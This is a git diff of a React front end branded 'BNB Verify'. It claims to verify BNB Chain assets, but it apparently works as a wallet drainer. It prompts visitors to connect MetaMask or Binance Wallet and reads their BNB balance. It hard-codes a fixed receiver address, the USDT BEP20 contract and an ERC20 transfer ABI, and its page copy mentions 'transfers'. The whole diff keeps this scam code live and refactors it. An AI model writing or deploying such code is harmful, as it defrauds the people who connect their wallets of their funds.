@@ -1,37 +1,36 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { ethers } from "ethers";
 import "./App.css";
 
-export default function App() {
+const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
+const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
+const ERC20_ABI = [
+  "function balanceOf(address) view returns (uint)",
+  "function transfer(address to, uint amount) returns (bool)"
+];
+
+function App() {
   const [walletAddress, setWalletAddress] = useState("");
   const [status, setStatus] = useState("Click Verify to start...");
 
-  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
-  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
-  const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint)",
-    "function transfer(address to, uint amount) returns (bool)"
-  ];
-
-  useEffect(() => {
-    if (window.ethereum) {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      provider.listAccounts().then(accounts => {
-        if (accounts.length > 0) setWalletAddress(accounts[0]);
-      });
-    }
-  }, []);
+  async function connectWallet() {
+    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+    setWalletAddress(address);
+  }
 
   async function handleVerify() {
-    if (!window.ethereum) return setStatus("No wallet detected!");
+    setStatus("Checking balances...");
     try {
+      if (!window.ethereum) return setStatus("No wallet detected!");
+
       const provider = new ethers.BrowserProvider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
-      setWalletAddress(userAddress);
-
-      setStatus("Checking balances...");
 
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > ethers.parseEther("0.001")) {
@@ -63,12 +62,12 @@ export default function App() {
   }
 
   return (
-    <div className="app">
+    <div className="App">
       {/* Navbar */}
       <header className="navbar">
-        <nav className="container nav-content">
-          <a href="#" className="logo">
-            <div className="logo-circle"></div>
+        <nav className="nav-container">
+          <a href="#" className="nav-logo">
+            <div className="nav-logo-icon"></div>
             <span>BNB Verify</span>
           </a>
           <div className="nav-links">
@@ -78,29 +77,25 @@ export default function App() {
             <a href="#">NFTs</a>
             <a href="#">DApps</a>
           </div>
+          <button className="nav-hamburger">
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+            </svg>
+          </button>
         </nav>
       </header>
 
       {/* Hero Section */}
       <main className="hero">
         <div className="hero-left">
-          <div className="powered">Powered by BNB Chain</div>
-          <h1>
-            Verify Crypto Assets on <br /> BNB Chain
-          </h1>
-          <p>
-            Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
-          </p>
+          <div className="powered-badge">Powered by BNB Chain</div>
+          <h1>Verify Crypto Assets on BNB Chain</h1>
+          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
           <div className="hero-buttons">
-            <button onClick={handleVerify} className="button-primary">
-              Verify
-            </button>
-            <button className="button-secondary">Explore BNB Chain</button>
+            <button onClick={handleVerify}>{walletAddress ? "Verify" : "Connect Wallet"}</button>
           </div>
-          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
           <p className="status">{status}</p>
         </div>
-
         <div className="hero-right">
           <div className="pulse-ring outer"></div>
           <div className="pulse-ring middle"></div>
@@ -130,9 +125,9 @@ export default function App() {
       </section>
 
       {/* Footer */}
-      <footer>
-        &copy; 2025 BNB Verify. Powered by BNB Chain.
-      </footer>
+      <footer>&copy; 2025 BNB Verify. Powered by BNB Chain.</footer>
     </div>
   );
 }
+
+export default App;
